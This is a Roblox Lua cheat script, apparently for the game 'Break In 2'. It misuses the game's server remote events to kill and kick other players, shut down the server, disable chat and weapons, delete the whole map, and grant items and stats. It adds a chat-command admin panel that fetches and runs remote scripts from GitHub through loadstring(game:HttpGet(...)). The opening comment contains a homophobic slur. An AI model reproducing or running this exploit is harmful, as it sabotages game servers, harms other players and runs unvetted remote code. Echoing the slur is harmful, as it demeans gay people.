-- TOUCH IT WITHOUT PERMISSION IF YOUR A GAY
if _G.on==nil then _G.on=false end
if _G.on==false then
_G.on=true
delay=false
_G.aura=false
function findplayer(x)
local player=nil
local x=string.lower(x)
for i,v in pairs(game.Players:GetPlayers()) do
if string.lower(v.Name)==x or string.lower(v.DisplayName)==x or string.lower(v.Name):sub(1, #x) == x or string.lower(v.DisplayName):sub(1, #x) == x then
  player=v
end
end
return player
end

local Notify = function(text)
local args = { [1] = 5, [2] = text } 
game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("PagesReplicate"):FireServer(unpack(args))
end
 local Revive = function() game.ReplicatedStorage.Events.TestRespawn:FireServer()
 end
Events = game.ReplicatedStorage.Events
local Give = function(Item)
  if string.lower(Item) == "armor" then
    game.ReplicatedStorage.Events:WaitForChild("Vending"):FireServer(3, "Armor2", "Armor", 'game.'..game.Players.LocalPlayer:GetFullName(), 1)
  else
  game.ReplicatedStorage.Events.Vending:FireServer(3, Item, "Weapons", game.Players.LocalPlayer.Name, 1)
  end
end
Speed = function()
Events:WaitForChild("RainbowWhatStat"):FireServer('Speed')
end
Strength = function()
Events:WaitForChild("RainbowWhatStat"):FireServer('Strength')
end
LocalPlayer = game.Players.LocalPlayer
unequip = function()
for i,v in pairs(LocalPlayer.Character:GetChildren()) do
if v:IsA('Tool') then
v.Parent = LocalPlayer.Backpack
end
end
end
local HealAll = function()
unequip()
task.wait(.2)
Give("GoldenApple")
task.wait(.5)
LocalPlayer.Backpack:WaitForChild("GoldenApple").Parent = LocalPlayer.Character

task.wait(.5)
game.ReplicatedStorage.Events:WaitForChild("HealTheNoobs"):FireServer()
end
local Destroy = function(part)
loadstring('game.ReplicatedStorage.Events:WaitForChild("OnDoorHit"):FireServer(game.'..part.Parent:GetFullName()..':FindFirstChild(tostring("'..part.Name..'")))')()
end
    local DisableChat = function()
    Destroy(game:GetService("ReplicatedStorage").DefaultChatSystemChatEvents)
    end
function Kill(x)
local plr=findplayer(x)
Destroy(plr.Character)
end
function DisableWeapons()
Destroy(game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("HitReplicate"))
end
local Heal = function(player)
if findplayer(player) ~= nil then
plr = findplayer(player)
Give('MedKit')
wait(2)
Medkit=game.Players.LocalPlayer.Backpack.MedKit
game.Players.LocalPlayer.Backpack.MedKit.Parent = game.Players.LocalPlayer.Character
wait(2)
task.spawn(function()
local args = {
  [1] = plr
                }

game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("HealPlayer"):FireServer(unpack(args))
end)
    Medkit.Parent = game.Players.LocalPlayer.Backpack
Destroy(Medkit)
end
end
    local Sound = function(sound, speed)
        task.spawn(function()
    local S = Instance.new('Sound', game.Players.LocalPlayer.Character)
    S.SoundId = sound
    S:Play()
            end)
    local args = {
    [1] = 1,
    [2] = sound,
    [3] = speed
    }
    game:GetService("ReplicatedStorage").Events.HitReplicate:FireServer(unpack(args))
    end
    local ServerGodMode = function()
 Destroy(game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("Energy")) 
    Destroy(game:GetService("ReplicatedStorage"):WaitForChild("Events"):WaitForChild("IceSlip"))
    end
function Shutdown()
for i,v in pairs(game.Players:GetPlayers()) do
if v~=game.Players.LocalPlayer then
            Destroy(v)
            end
        end
Destroy(game.Players.LocalPlayer)
    end
function Kick(x)
local a=findplayer(x)
    Destroy(a)
end
function DisableBadGuys()
Destroy(game:GetService("Workspace").BadGuys)
end
function DisableBadGuysBoss()
Destroy(game:GetService("Workspace").BadGuysBoss)
end
function DisableBadGuysFront()
Destroy(game:GetService("Workspace").BadGuysFront)
end
function DeleteBadPizzaGuy() Destroy(game:GetService("Workspace"):FindFirstChild("BadGuyPizza"))
end
function DeleteBrute() Destroy(game:GetService("Workspace"):FindFirstChild("BadGuyBrute"))
end
function DisableEnemies()
DeleteBrute()
DeleteBadPizzaGuy()
DisableBadGuysBoss()
DisableBadGuysFront()
DisableBadGuys()
end
function Damage(x)
task.spawn(function()
    local remainingDamage = x
    while remainingDamage > 0 do
task.wait()
        local damageToDeal = math.min(remainingDamage, 100)
        remainingDamage = remainingDamage - damageToDeal


        for i, v in pairs(game:GetService("Workspace").BadGuys:GetChildren()) do
            Events:WaitForChild("HitBadguy"):FireServer(v, damageToDeal, 4)
        end

        for i, v in pairs(game:GetService("Workspace").BadGuysBoss:GetChildren()) do
            Events:WaitForChild("HitBadguy"):FireServer(v, damageToDeal, 4)
        end

        for i, v in pairs(game:GetService("Workspace").BadGuysFront:GetChildren()) do
            Events:WaitForChild("HitBadguy"):FireServer(v, damageToDeal, 4)
        end

        if game:GetService("Workspace"):FindFirstChild("BadGuyPizza", true) then
            Events:WaitForChild("HitBadguy"):FireServer(game:GetService("Workspace"):FindFirstChild("BadGuyPizza", true), damageToDeal, 4)
        end

        if game:GetService("Workspace"):FindFirstChild("BadGuyBrute") then
            Events:WaitForChild("HitBadguy"):FireServer(game:GetService("Workspace").BadGuyBrute, damageToDeal, 4)
        end
    end
end)
end
task.spawn(function()
while _G.aura do
Damage(100)
            task.wait(0.5)
        end
    end)
local admins = {}
local owners = {}
local mods={}
local creator=game.Players.LocalPlayer
admins[game.Players.LocalPlayer.Name]='Admin'
owners[game.Players.LocalPlayer.Name]='Owner'
mods[game.Players.LocalPlayer.Name]='Moderator'
prefix='/'

function cmd(message, plr)
if admins[plr.Name] or owners[plr.Name] or mods[plr.Name] then
if message:sub(#prefix, #prefix) == prefix then
      local args = {}
      for arg in message:gmatch("%S+") do
          table.insert(args, arg)
      end
            if args[2] then
            if string.lower(args[2])=='me' then
                args[2]=plr.Name
            end
            end
args[1]=string.lower(args[1]:sub(#prefix + 1)) 
if args[1]=='dmg' and args[2] then
                Damage(tonumber(args[2]))
            end
if args[1]=='aura' and args[2] then
                if string.lower(args[2])=='on' then
                    _G.aura=true
                elseif string.lower(args[2])=='off' then
                    _G.aura=false
                end
            end
if args[1]=='shutdown' then
                Shutdown()
   end
            if args[1]==('nochat' or 'disablechat') then
                DisableChat()
            end
                if args[1]=='brainrot' then loadstring(game:HttpGet('https://raw.githubusercontent.com/Nivgab/Lua-Projects/main/Protected_2115791341692333.lua.txt', true))()
                end
if args[1]=='egghunt' then
                 loadstring(game:HttpGet('https://raw.githubusercontent.com/Nivgab/Lua-Projects/main/Egg%20hunt', true))()
                end
if args[1]=='hard' then
                    loadstring(game:HttpGet("https://raw.githubusercontent.com/Nivgab/Scripts/main/Bi2/Protected_7482730181272944.lua.txt", true))()
                end
if args[1]=='sword' then
                    loadstring(game:HttpGet('https://raw.githubusercontent.com/Nivgab/Lua-Projects/main/FE%20break%20in%202%20linked%20sword.lua', true))()
                end
            if args[1]=='revive' then Revive() end
if args[1]=='noweapons' then
DisableWeapons()
            end
    if args[1]=='noenemies' then
                DisableEnemies()
            end
      if args[1] == ('admin' or 'adminastor') and args[2] and owners[plr.Name] then
          local playerName = args[2]
local targetPlayer = findplayer(playerName)
                if admins[targetPlayer.Name]==nil then
              admins[targetPlayer.Name] = 'Admin'
                else
admins[targetPlayer.Name]=nil
                end
      end
if args[1]=='notify' and args[2] then
local text=table.concat(args, ' ', 2)
Notify(text)
            end
if args[1]=='kill' and args[2] then
                Kill(args[2])
            end
if args[1]=='kick' and args[2] then
Kick(args[2])
            end
if args[1]==('god' or 'godmode') then
                    ServerGodMode()
                end

if args[1]=='speed' then
for i=1, tonumber(args[2]) do
Speed()
                    end
end
if args[1] == 'strength' then
for i=1, tonumber(args[2]) do
Strength()
                    end
end

if args[1]==('sound' or 'play') and args[2] then
Sound(args[2], 1)
        end
if args[1]=='heal' and args[2] then

Heal(args[2])
                    end
                if args[1]=='healall' then
                HealAll()
            end
if args[1] =='give' and args[2] then
Give(args[2])
            end
                if args[1]=='nuke' then
for i,v in pairs(workspace:GetChildren()) do
Destroy(v)
                    end
                end
 if args[1] == 'prefix' and args[2] and plr==creator then
prefix=args[2]
print('prefix has been set to '..args[2])
end
 if args[1] == ('cmds' or 'commands') then
print[[

THERE IS A 0.5 SECOND DELAY BETWEEN EACH COMMAND USED
prefix [string] (creator only command)
admin [playername] (can use short name) (owner+ only command) (use command on same person again to remove rank)
cmds
owner [playername] (can use short name) (creator only command) (use command on same person again to remove rank)
mod/moderator [playername] (can use shortname) (admin only command) (use command on same person again to remove rank)
speed [amount] (gain speed) (only works on creator) (aka the player that executed the script)
strength [amount] (same as speed but you gain strength)
give [itemname] (gives the localplayer the item) (creator only)
heal [username or 'all']
sound [assetid]
god (makes every player invincible)
shutdown
kick [playername]
noweapons (break weapon damaging)
revive
kill [playername]
healall
notify [text] (only works once)
nochat (disable chat)
noenemies (disable enemies) (can softlock the game)
dmg [number] damage nearby enemies
brainrot (walking sounds, jump replaced with brainrot sounds fe)
egghunt (fe egg hunt) (the eggs arent fe but sounds, rewards are)
hard (fe hard mode)
sword (fe sword) (model isnt fe but everything else is)
nuke (destroy every part)

]]
            end
if args[1]=='owner' and args[2] and plr==creator then
local target=findplayer(args[2])
                if target then
                    if owners[target.Name]==nil then
owners[target.Name]='Owner'
                    else
owners[target.Name]=nil
                    end
                end
            end
if args[1]=='credits' then
print[[

Secment

]]
            end
if args[1]==('mod' or 'moderator') and args[2] and admins[plr.Name] then
local target=findplayer(args[2])
if mods[target.Name]==nil then
mods[target.Name]='Moderator'
                else
mods[target.Name]=false
                end
            end
if args[1]==('rank' or 'getrank') then
print(mods[plr.Name] or admins[plr.Name] or owners[plr.Name])
            end
  end
end
end
for i,v in pairs(game.Players:GetPlayers()) do
v.Chatted:Connect(function(chats)
            if delay==false then
                delay=true
cmd(chats, v)
wait(0.5)
delay=false
            end
        end)
end
end
